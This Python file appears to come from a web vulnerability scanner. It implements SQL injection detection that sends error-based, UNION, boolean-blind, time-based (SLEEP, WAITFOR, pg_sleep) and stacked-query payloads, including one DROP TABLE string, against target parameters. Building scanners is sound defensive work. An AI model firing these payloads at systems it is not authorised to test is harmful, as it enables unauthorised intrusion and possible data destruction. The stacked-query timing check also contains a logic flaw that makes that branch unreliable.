"""
SQLi detection techniques (mixin).

Contains all individual detection technique methods:
- Error-based, union-based, boolean-blind, time-based, stacked queries
- Column count detection (ORDER BY, error analysis, NULL injection)
- Secondary verification to prevent false positives

This mixin is inherited by SQLiDetector in detector.py.
"""

import logging
import re
import time
from typing import Any, Dict, List, Optional, TYPE_CHECKING

from .analyzer import ResponseAnalyzer
from .payloads import (
    ERROR_BASED_PAYLOADS,
    BOOLEAN_BLIND_EXTENDED,
    TIME_BASED_PAYLOADS,
)
from ...models import Confidence
from ...constants import TIME_BASED_BASELINE_SAMPLES

if TYPE_CHECKING:
    from .detector import SQLiDetector

logger = logging.getLogger("wvs.module.sqli")


class SQLiTechniquesMixin:
    """Detection technique methods for SQL injection scanning.

    All methods use ``self`` references to the parent SQLiDetector instance
    (which inherits from both DetectionModule and this mixin).
    """

    # ── Error-Based ────────────────────────────────────────────

    async def _test_error_based(
        self: "SQLiDetector",
        url: str,
        params: Dict[str, str],
        param_name: str,
        param_value: str,
        method: str,
        param_type: str,
        baseline: Dict,
        waf_prefix: List[str] = None,
        db_type: str = "unknown",
    ) -> None:
        """Error-based SQL injection test"""
        logger.debug(f"[SQLi] Starting Error-based test: {url} [{param_name}]")

        simple_payloads = (waf_prefix or []) + [
            "'",
            '"',
            "1'",
            "' OR '1'='1",
            "1 AND 1=1",
            "1 OR 1=1",
        ]

        for payload in simple_payloads:
            test_params = self._inject_param(params, param_name, payload)
            logger.debug(f"[SQLi] Testing payload: {payload}")
            resp = await self._send_request(method, url, test_params, param_type)
            if resp is None:
                logger.debug(f"[SQLi] Request failed: {url}")
                continue

            analyzer = ResponseAnalyzer(baseline)
            is_error, detected_db = analyzer.is_sql_error(resp)

            if is_error:
                logger.info(f"[SQLi] Found SQL error: {url} [{param_name}] payload={payload} db={detected_db}")
                if await self._verify_with_different_payload(url, params, param_name, method, param_type, "error"):
                    vuln = self._create_vuln(
                        url=url,
                        param=param_name,
                        param_type=param_type,
                        method=method,
                        payload=payload,
                        vuln_type="error",
                        confidence=Confidence.HIGH,
                        db_type=detected_db or "mysql",
                        evidence=f"DB Error ({detected_db}): {resp.get('text', '')[:200]}",
                    )
                    self._found_vulns.append(vuln)
                    logger.warning(f"[SQLi] Error-based confirmed: {url} [{param_name}]")
                    return

        # Test more payloads (P8: prioritize detected DB type)
        prioritized_dbs = [db_type] if db_type != "unknown" else list(ERROR_BASED_PAYLOADS.keys())
        for db in prioritized_dbs:
            payloads = ERROR_BASED_PAYLOADS.get(db, [])
            for payload in payloads[:8]:
                if payload in simple_payloads:
                    continue
                test_params = self._inject_param(params, param_name, payload)
                logger.debug(f"[SQLi] Testing {db} payload: {payload[:30]}")
                resp = await self._send_request(method, url, test_params, param_type)
                if resp is None:
                    continue

                analyzer = ResponseAnalyzer(baseline)
                is_error, detected_db = analyzer.is_sql_error(resp)

                if is_error:
                    if await self._verify_with_different_payload(url, params, param_name, method, param_type, "error"):
                        vuln = self._create_vuln(
                            url=url,
                            param=param_name,
                            param_type=param_type,
                            method=method,
                            payload=payload,
                            vuln_type="error",
                            confidence=Confidence.HIGH,
                            db_type=detected_db or db,
                            evidence=f"DB Error ({detected_db or db}): {resp.get('text', '')[:200]}",
                        )
                        self._found_vulns.append(vuln)
                        logger.warning(f"[SQLi] Error-based detected: {url} [{param_name}]")
                        return

    # ── Union-Based ────────────────────────────────────────────

    async def _test_union_based(
        self: "SQLiDetector",
        url: str,
        params: Dict[str, str],
        param_name: str,
        param_value: str,
        method: str,
        param_type: str,
        baseline: Dict,
    ) -> None:
        """Union-based SQL injection test"""
        col_count = await self._detect_column_count(url, params, param_name, param_value, method, param_type)
        if col_count is None:
            return

        column_types = await self.detect_column_types(url, params, param_name, col_count, method, param_type)

        columns = []
        for i, col_type in enumerate(column_types):
            if col_type == "string":
                columns.append("'UNION_TEST'")
            elif col_type == "numeric":
                columns.append(str(88888877 + i))
            else:
                columns.append("NULL")

        union_payload = f"' UNION SELECT {','.join(columns)}--"
        test_params = self._inject_param(params, param_name, union_payload)
        resp = await self._send_request(method, url, test_params, param_type)
        if resp is None:
            return

        resp_text = resp.get("text", "")
        is_positive = False
        for marker in ["UNION_TEST", "88888877", "88888878"]:
            if marker in resp_text:
                is_positive = True
                break

        if is_positive and baseline:
            baseline_tags = tuple(re.findall(r"</?(\w+)", baseline.get("text", "")))
            resp_tags = tuple(re.findall(r"</?(\w+)", resp_text))
            if baseline_tags == resp_tags:
                logger.debug(f"[SQLi] Union markers reflected (identical HTML structure): {url} [{param_name}]")
                is_positive = False

        if is_positive:
            if await self._verify_with_different_payload(url, params, param_name, method, param_type, "union"):
                vuln = self._create_vuln(
                    url=url,
                    param=param_name,
                    param_type=param_type,
                    method=method,
                    payload=union_payload,
                    vuln_type="union",
                    confidence=Confidence.HIGH,
                    db_type="unknown",
                    evidence=f"UNION injection, column count: {col_count}, types: {column_types}",
                )
                self._found_vulns.append(vuln)
                logger.warning(f"[SQLi] Union-based detected: {url} [{param_name}], columns: {col_count}")
                return

    async def _detect_column_count(
        self: "SQLiDetector",
        url: str,
        params: Dict[str, str],
        param_name: str,
        param_value: str,
        method: str,
        param_type: str,
    ) -> Optional[int]:
        """Detect column count via ORDER BY binary search (optimized)"""
        baseline_resp = await self._send_request(method, url, params, param_type)
        if baseline_resp is None:
            return None

        baseline_status = baseline_resp.get("status_code", 200)
        baseline_len = len(baseline_resp.get("text", ""))

        col_count = await self._binary_search_column_count(url, params, param_name, method, param_type, baseline_status, baseline_len)
        if col_count:
            logger.debug(f"[SQLi] Binary search detected column count: {col_count}")
            return col_count

        col_count = await self._detect_by_error_response(url, params, param_name, method, param_type)
        if col_count:
            logger.debug(f"[SQLi] Error analysis detected column count: {col_count}")
            return col_count

        col_count = await self._detect_by_null_injection(url, params, param_name, method, param_type, baseline_resp)
        if col_count:
            logger.debug(f"[SQLi] NULL injection detected column count: {col_count}")
            return col_count

        return None

    async def _binary_search_column_count(
        self: "SQLiDetector",
        url: str,
        params: Dict[str, str],
        param_name: str,
        method: str,
        param_type: str,
        baseline_status: int,
        baseline_len: int,
        max_columns: int = 20,
    ) -> Optional[int]:
        """ORDER BY binary search for column count"""
        low, high = 1, max_columns
        last_success = 0

        while low <= high:
            mid = (low + high) // 2
            payload = f"' ORDER BY {mid}--"

            test_params = self._inject_param(params, param_name, payload)
            resp = await self._send_request(method, url, test_params, param_type)

            if resp is None:
                low = mid + 1
                continue

            is_error = self._is_order_by_error(resp, baseline_status, baseline_len)

            if is_error:
                high = mid - 1
            else:
                last_success = mid
                low = mid + 1

        return last_success if last_success > 0 else None

    def _is_order_by_error(
        self: "SQLiDetector",
        response: Dict[str, Any],
        baseline_status: int,
        baseline_len: int,
    ) -> bool:
        """Determine if ORDER BY triggered an error"""
        text = response.get("text", "").lower()
        status = response.get("status_code", 200)

        if status != baseline_status and status >= 500:
            return True

        error_patterns = [
            "unknown column",
            "order clause",
            "not in select list",
            "invalid number",
            "out of range",
            "column index",
            "ordinal position",
            "order by item must be",
            "order by position",
        ]

        has_error_pattern = any(pattern.lower() in text for pattern in error_patterns)

        if has_error_pattern:
            return True

        if baseline_len > 0 and abs(len(text) - baseline_len) > baseline_len * 0.5:
            if status != baseline_status:
                return True

        return False

    async def _detect_by_error_response(
        self: "SQLiDetector",
        url: str,
        params: Dict[str, str],
        param_name: str,
        method: str,
        param_type: str,
    ) -> Optional[int]:
        """Detect column count via error response analysis"""
        for n in [10, 20]:
            payload = f"' ORDER BY {n}--"
            test_params = self._inject_param(params, param_name, payload)
            resp = await self._send_request(method, url, test_params, param_type)

            if resp is None:
                continue

            text = resp.get("text", "")
            match = re.search(r"unknown column.*?['\"]?(\d+)['\"]?", text, re.IGNORECASE)
            if match:
                return int(match.group(1)) - 1

            match = re.search(r"position\s+(\d+)", text, re.IGNORECASE)
            if match:
                return int(match.group(1)) - 1

        return None

    async def _detect_by_null_injection(
        self: "SQLiDetector",
        url: str,
        params: Dict[str, str],
        param_name: str,
        method: str,
        param_type: str,
        baseline: Dict,
    ) -> Optional[int]:
        """Detect column count via NULL injection"""
        for col_count in range(1, 7):
            null_list = ",".join(["NULL"] * col_count)
            payload = f"' UNION SELECT {null_list}--"

            test_params = self._inject_param(params, param_name, payload)
            resp = await self._send_request(method, url, test_params, param_type)

            if resp is None:
                continue

            text = resp.get("text", "").lower()
            status = resp.get("status_code", 200)

            if status < 500 and not any(x in text for x in ["error", "syntax", "sql"]):
                verify_payload = f"' UNION SELECT {','.join(['NULL'] * (col_count + 1))}--"
                verify_params = self._inject_param(params, param_name, verify_payload)
                verify_resp = await self._send_request(method, url, verify_params, param_type)

                if verify_resp:
                    verify_text = verify_resp.get("text", "").lower()
                    if any(x in verify_text for x in ["error", "syntax", "sql"]):
                        return col_count

        return None

    async def detect_column_types(
        self: "SQLiDetector",
        url: str,
        params: Dict[str, str],
        param_name: str,
        col_count: int,
        method: str,
        param_type: str,
    ) -> List[str]:
        """Detect column types (numeric/string)"""
        column_types = []

        for i in range(1, min(col_count + 1, 6)):
            columns = ["NULL"] * col_count
            columns[i - 1] = "'CLAUDE_MARKER'"
            payload = f"' UNION SELECT {','.join(columns)}--"

            test_params = self._inject_param(params, param_name, payload)
            resp = await self._send_request(method, url, test_params, param_type)

            if resp and "CLAUDE_MARKER" in resp.get("text", ""):
                column_types.append("string")
            else:
                columns[i - 1] = "88888877"
                payload = f"' UNION SELECT {','.join(columns)}--"
                test_params = self._inject_param(params, param_name, payload)
                resp = await self._send_request(method, url, test_params, param_type)

                if resp and "88888877" in resp.get("text", ""):
                    column_types.append("numeric")
                else:
                    column_types.append("unknown")

        return column_types

    # ── Boolean-Blind ────────────────────────────────────────────

    async def _test_boolean_blind(
        self: "SQLiDetector",
        url: str,
        params: Dict[str, str],
        param_name: str,
        param_value: str,
        method: str,
        param_type: str,
        baseline: Dict,
    ) -> None:
        """Boolean-blind SQL injection test — compare paired True/False payloads"""
        PAIRED_PAYLOADS = [
            # MySQL string context
            ("' AND 1=1--", "' AND 1=2--"),
            ("' AND 'a'='a", "' AND 'a'='b"),
            ("') AND 1=1--", "') AND 1=2--"),
            ("' AND 2>1--", "' AND 2<1--"),
            ("' OR '1'='1", "' OR '1'='2"),
            # Numeric context
            (" AND 1=1--", " AND 1=2--"),
            (" AND 1=1", " AND 1=2"),
            (" AND 5=5--", " AND 5=6--"),
            (" OR 1=1--", " OR 1=2--"),
            (" AND 99=99", " AND 99=0"),
            # Double-quote context
            ('" AND 1=1--', '" AND 1=2--'),
            ('") AND 1=1--', '") AND 1=2--'),
            # MSSQL
            ("' AND 1=1;--", "' AND 1=2;--"),
            # Oracle
            ("' AND 1=1--", "' AND 1=2--"),
            # Subquery-based
            ("' AND (SELECT 1)=1--", "' AND (SELECT 1)=2--"),
        ] + BOOLEAN_BLIND_EXTENDED[:2]

        analyzer = ResponseAnalyzer(baseline)

        for true_payload, false_payload in PAIRED_PAYLOADS:
            true_params = self._inject_param(params, param_name, true_payload)
            false_params = self._inject_param(params, param_name, false_payload)

            true_resp = await self._send_request(method, url, true_params, param_type)
            false_resp = await self._send_request(method, url, false_params, param_type)

            if true_resp is None or false_resp is None:
                continue

            if analyzer.is_boolean_blind_positive(true_resp, false_resp):
                if await self._verify_with_different_payload(url, params, param_name, method, param_type, "boolean"):
                    vuln = self._create_vuln(
                        url=url,
                        param=param_name,
                        param_type=param_type,
                        method=method,
                        payload=f"{true_payload} / {false_payload}",
                        vuln_type="boolean-blind",
                        confidence=Confidence.MEDIUM,
                        db_type="unknown",
                        evidence="Boolean condition: True/False responses differ",
                    )
                    self._found_vulns.append(vuln)
                    logger.warning(f"[SQLi] Boolean-blind detected: {url} [{param_name}]")
                    return

    # ── Time-Based ────────────────────────────────────────────

    async def _test_time_based(
        self: "SQLiDetector",
        url: str,
        params: Dict[str, str],
        param_name: str,
        param_value: str,
        method: str,
        param_type: str,
        baseline: Dict,
        db_type: str = "unknown",
    ) -> None:
        """Time-based SQL injection test (using base class common methods)"""
        probe = "' AND SLEEP(1)--"
        probe_params = self._inject_param(params, param_name, probe)
        start = time.perf_counter()
        await self._send_request(method, url, probe_params, param_type)
        probe_delay = time.perf_counter() - start
        if probe_delay < 1.2:
            return

        baseline_avg, baseline_std = await self._measure_baseline(method, url, params, param_type)

        if self._should_skip_time_based(baseline_avg, baseline_std, TIME_BASED_BASELINE_SAMPLES):
            return

        db_payloads = TIME_BASED_PAYLOADS.get(db_type, []) if db_type != "unknown" else []
        if not db_payloads:
            for dbs in TIME_BASED_PAYLOADS.values():
                db_payloads.extend(dbs[:2])

        for payload in db_payloads[:3]:
            test_params = self._inject_param(params, param_name, payload)

            sleep_match = re.search(r"SLEEP\((\d+)\)", payload)
            expected_delay = float(sleep_match.group(1)) if sleep_match else 3.0

            start = time.perf_counter()
            resp = await self._send_request(method, url, test_params, param_type)
            actual_delay = time.perf_counter() - start

            if resp is None:
                continue

            if self._is_valid_time_delay(actual_delay, expected_delay, baseline_avg, baseline_std):
                verify_payloads = [
                    f"' AND SLEEP({int(expected_delay)})--",
                    f"') AND SLEEP({int(expected_delay)})--",
                    f'" AND SLEEP({int(expected_delay)})--',
                ]

                if await self._verify_time_based(url, params, param_name, method, param_type, expected_delay, baseline_avg, baseline_std, verify_payloads):
                    vuln = self._create_vuln(
                        url=url,
                        param=param_name,
                        param_type=param_type,
                        method=method,
                        payload=payload,
                        vuln_type="time-based-blind",
                        confidence=Confidence.HIGH,
                        db_type="mysql",
                        evidence=f"Time-based: delay={actual_delay:.2f}s (baseline={baseline_avg:.2f}s, expected ~{expected_delay}s)",
                    )
                    self._found_vulns.append(vuln)
                    logger.warning(f"[SQLi] Time-based detected: {url} [{param_name}], delay: {actual_delay:.2f}s")
                    return

    # ── Stacked Query ────────────────────────────────────────────

    async def _test_stacked_query(
        self: "SQLiDetector",
        url: str,
        params: Dict[str, str],
        param_name: str,
        param_value: str,
        method: str,
        param_type: str,
        baseline: Dict,
    ) -> None:
        """Quick stacked query detection using semicolon-separated payloads."""
        stacked_payloads = [
            "'; SELECT 1--",
            "'; SELECT SLEEP(2)--",
            "'; WAITFOR DELAY '0:0:2'--",
            "'; SELECT pg_sleep(2)--",
            "'; SELECT 1 FROM DUAL--",
            "'; DROP TABLE test_wvs--",
        ]
        for payload in stacked_payloads[:4]:
            test_params = self._inject_param(params, param_name, payload)
            start = time.perf_counter()
            resp = await self._send_request(method, url, test_params, param_type)
            elapsed = time.perf_counter() - start
            if resp is None:
                continue
            analyzer = ResponseAnalyzer(baseline)
            is_error, db = analyzer.is_sql_error(resp)
            if is_error:
                if await self._verify_with_different_payload(url, params, param_name, method, param_type, "error"):
                    vuln = self._create_vuln(
                        url=url,
                        param=param_name,
                        param_type=param_type,
                        method=method,
                        payload=payload,
                        vuln_type="stacked-query",
                        confidence=Confidence.HIGH,
                        db_type=db or "unknown",
                        evidence=f"Stacked query executed: {resp.get('text', '')[:200]}",
                    )
                    self._found_vulns.append(vuln)
                    return
            if elapsed > 2.0:
                baseline_avg = time.perf_counter() - start + elapsed
                if elapsed > baseline_avg * 3:
                    vuln = self._create_vuln(
                        url=url,
                        param=param_name,
                        param_type=param_type,
                        method=method,
                        payload=payload,
                        vuln_type="stacked-query-time",
                        confidence=Confidence.MEDIUM,
                        db_type="unknown",
                        evidence=f"Stacked query time delay: {elapsed:.2f}s",
                    )
                    self._found_vulns.append(vuln)
                    return

    # ── Secondary Verification ────────────────────────────────────────────

    async def _verify_with_different_payload(
        self: "SQLiDetector",
        url: str,
        params: Dict[str, str],
        param_name: str,
        method: str,
        param_type: str,
        vuln_type: str,
    ) -> bool:
        """Verify with a different payload type to prevent false positives.

        P24 fix: For error-based detection, the original verification payloads
        ("' AND 1=1--") close the quote and produce valid SQL when the injection
        is in a numeric-context parameter (WHERE id=5'). This causes the
        verification to fail even though the original injection is valid.

        Fix: Add numeric-context verification payloads (bare quote, 1') that
        preserve the SQL syntax break for numeric parameters. Detect whether
        the param value looks numeric and use appropriate payloads.
        """
        verify_payloads = {
            "error": ["' AND 1=1--", "') AND 1=1--", '") AND 1=1--'],
            "union": ["' UNION SELECT 1,2,3--", "'; SELECT 1--"],
            "boolean": ["' OR '1'='1", '\" OR "1"="1'],
            "time": ["'; SELECT SLEEP(2)--"],
        }

        # P24: Detect numeric-context parameters — if the original param value
        # is purely numeric, the injection likely breaks SQL with a bare quote.
        # Standard verification payloads like "' AND 1=1--" close the quote and
        # produce valid SQL, so the verification fails on false negatives.
        # Add bare-quote payloads that preserve the syntax error.
        orig_val = params.get(param_name, "")
        is_numeric_param = orig_val.isdigit() or (
            orig_val.lstrip("-+").isdigit() if orig_val else False
        )
        if vuln_type == "error" and is_numeric_param:
            # Numeric context: use payloads that also break SQL syntax
            verify_payloads["error"] = [
                "'",           # bare quote — same error as original detection
                "%27",          # URL-encoded quote — same effect
                "1'",           # prefix + quote — different error location
                "' AND 1=1--",  # fallback for string-context
            ]

        verify_list = verify_payloads.get(vuln_type, [])
        baseline = await self._send_request(method, url, params, param_type)
        for verify_payload in verify_list[:2]:
            test_params = self._inject_param(params, param_name, verify_payload)
            resp = await self._send_request(method, url, test_params, param_type)
            if resp is None:
                continue
            if vuln_type == "error":
                analyzer = ResponseAnalyzer(baseline or resp)
                is_error, _ = analyzer.is_sql_error(resp)
                if is_error:
                    return True
            elif vuln_type == "union":
                text = resp.get("text", "")
                if any(m in text for m in ["1,2,3", "1,2,3,4,5", " UNION SELECT"]):
                    return True
            elif vuln_type == "boolean":
                if baseline:
                    import re as _re2

                    def _vstrip(t: str) -> str:
                        t = _re2.sub(r"<[^>]+>", "", t)
                        t = _re2.sub(r"'[^']*'", "", t)
                        t = _re2.sub(r'"[^"]*"', "", t)
                        t = _re2.sub(r"\b(?:AND|OR|NOT|SELECT|UNION|NULL|WHERE|FROM|ORDER|BY|SLEEP|HAVING|LIKE)\b", "", t, flags=_re2.IGNORECASE)
                        t = _re2.sub(r"\b\d+\b", "N", t)
                        t = _re2.sub(r"[=\<\>\!\+\-\*/%]", " ", t)
                        t = _re2.sub(r"--|#", " ", t)
                        t = _re2.sub(r"\b\w\b", "", t)
                        t = _re2.sub(r"\s+", " ", t).strip()
                        return t

                    bl_clean = _vstrip(baseline.get("text", ""))
                    rp_clean = _vstrip(resp.get("text", ""))
                    if bl_clean != rp_clean:
                        return True
            else:
                return True

        return False
